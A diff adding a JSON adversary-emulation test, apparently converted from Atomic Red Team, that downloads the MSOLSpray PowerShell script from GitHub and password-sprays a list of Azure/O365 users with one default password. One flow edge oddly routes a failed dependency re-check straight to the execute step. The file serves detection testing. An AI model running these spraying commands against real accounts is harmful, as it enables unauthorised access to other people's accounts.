@@ -1,0 +1,92 @@
+{
+  "id": "f3a10056-0160-4785-8744-d9bd7c12dc39",
+  "name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)",
+  "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "860deb18-9e63-41c6-803e-b4b492ad7ff5",
+      "type": "execute-command",
+      "data": {
+        "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "36e5f54a-18f6-43b0-aeca-c3a60cded0bc",
+      "name": "Check dependency 1/1",
+      "description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "15683010-faa4-4008-a965-2dbc910eb407",
+      "name": "Resolve dependency 1/1",
+      "description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "75b98efe-0fd9-479a-a861-c445f420648d",
+      "name": "Re-check dependency 1/1",
+      "description": "MSOLSpray module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "36e5f54a-18f6-43b0-aeca-c3a60cded0bc",
+      "p": "on-success",
+      "o": "860deb18-9e63-41c6-803e-b4b492ad7ff5"
+    },
+    {
+      "s": "36e5f54a-18f6-43b0-aeca-c3a60cded0bc",
+      "p": "on-failure",
+      "o": "15683010-faa4-4008-a965-2dbc910eb407"
+    },
+    {
+      "s": "15683010-faa4-4008-a965-2dbc910eb407",
+      "p": "on-success",
+      "o": "75b98efe-0fd9-479a-a861-c445f420648d"
+    },
+    {
+      "s": "75b98efe-0fd9-479a-a861-c445f420648d",
+      "p": "on-failure",
+      "o": "860deb18-9e63-41c6-803e-b4b492ad7ff5"
+    }
+  ],
+  "tags": [
+    "T1110.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Single password to try against the list of user accounts",
+      "value": "P@ssword1"
+    },
+    {
+      "name": "user_list",
+      "type": "string",
+      "description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)",
+      "value": "$env:temp\\T1110.003UserList.txt"
+    }
+  ]
+}
